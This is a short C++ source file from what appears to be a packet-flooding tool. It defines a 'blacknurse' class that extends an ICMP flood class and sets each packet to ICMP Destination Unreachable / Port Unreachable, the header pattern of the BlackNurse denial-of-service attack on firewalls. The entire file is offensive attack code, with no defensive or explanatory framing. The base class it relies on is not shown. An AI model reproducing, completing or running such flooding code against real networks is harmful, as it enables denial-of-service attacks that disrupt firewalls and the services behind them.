#include "blacknurse.h"

blacknurse::blacknurse(std::shared_ptr<Config> config)
    : icmp_flood(std::move(config)) {}

void blacknurse::finalize_hdr(icmphdr *icmp, iphdr *ip) {
  icmp->type = ICMP_DEST_UNREACH;
  icmp->code = ICMP_PORT_UNREACH;
  icmp_flood::finalize_hdr(icmp, ip);
}
